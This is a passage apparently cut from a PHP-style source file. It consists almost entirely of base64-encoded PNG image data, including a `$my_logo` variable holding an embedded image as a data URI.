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";
$my_logo = "data:image/png;base64,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